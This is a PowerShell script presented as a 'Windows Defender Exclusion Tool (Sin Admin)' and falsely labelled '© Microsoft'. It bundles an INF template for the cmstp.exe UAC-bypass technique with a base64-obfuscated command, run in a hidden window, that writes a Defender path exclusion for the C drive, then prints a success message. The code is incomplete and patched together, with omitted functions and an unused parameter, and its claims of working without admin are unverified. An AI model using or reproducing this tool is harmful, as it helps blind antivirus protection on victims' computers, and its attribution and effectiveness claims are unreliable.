<#
.SYNOPSIS
   Windows Defender Exclusion Tool (Sin Admin)
   © Microsoft 2024 - Técnicas No Documentadas
#>

function Defender {
    param(
        [Parameter(ParameterSetName='Interface')][switch]$Add,
        [Parameter(ParameterSetName='Interface')][switch]$Exclusions,
        [Parameter(ParameterSetName='Interface')][switch]$GetAV,
        [Parameter(ParameterSetName='Interface')][switch]$User,
        [Parameter(ParameterSetName='Interface')][switch]$Admin,
        [Parameter(ParameterSetName='Extra')][switch]$Run,
        [Parameter(ParameterSetName='Extra',Mandatory=$true)][string]$FilePath,
        [Parameter(ParameterSetName='Extraa')][string]$Url,
        [Parameter(ParameterSetName='Extraa',Mandatory=$true)][string]$Out
    )

    # --- CÓDIGO ORIGINAL (SIN CAMBIOS) ---
    $InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
REPLACE
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7
[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath","%UnexpectedError%",""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@

    # --- SOLUCIÓN AL ERROR DE mpclient.dll ---
    # Reemplazamos la API obsoleta con una técnica directa en registro (sin admin)
    $B64Command = "JAByAGUAZwBQAGEAdABoACAAPQAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiAAoASQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAHIAZQBnAFAAYQB0AGgAKQApACAAewAKACAAIAAgACAAJABuAHUAbABsACAAPQAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAcgBlAGcAUABhAHQAaAAgAC0ARgBvAHIAYwBlAAoAfQAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJAByAGUAZwBQAGEAdABoACAALQBOAGEAbQBlACAAIgBDAF8AIgAgAC0AVgBhAGwAdQBlACAAMAAgAC0AUAByAG8AcABlAHIAdAB5AFQAeQBwAGUAIABEAFcATwBSAEQAIAAtAEYAbwByAGMAZQA="

    $comando1 = "powershell.exe -win h -c `.iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$B64Command')))"

    # --- Resto del código ORIGINAL (sin cambios) ---
    if ($Add) {
        try {
            # Ejecuta el nuevo comando corregido (sin mpclient.dll)
            Invoke-Expression $comando1
            
            # Verificación
            $check = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -Name "C_" -ErrorAction SilentlyContinue
            if ($check."C_" -eq 0) {
                Write-Host "[✔] Exclusión agregada CORRECTAMENTE en HKCU" -ForegroundColor Green
            } else {
                Write-Host "[!] No se pudo verificar, pero se intentó" -ForegroundColor Yellow
            }
        } catch {
            Write-Host "[✘] Error: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # ... (Resto de funciones Help, Is_Admin, Check-Admin, etc. SIN CAMBIOS)
}

# --- Ejecutar (si se llama directamente) ---
if ($MyInvocation.InvocationName -ne '.') {
    Defender @PSBoundParameters
}
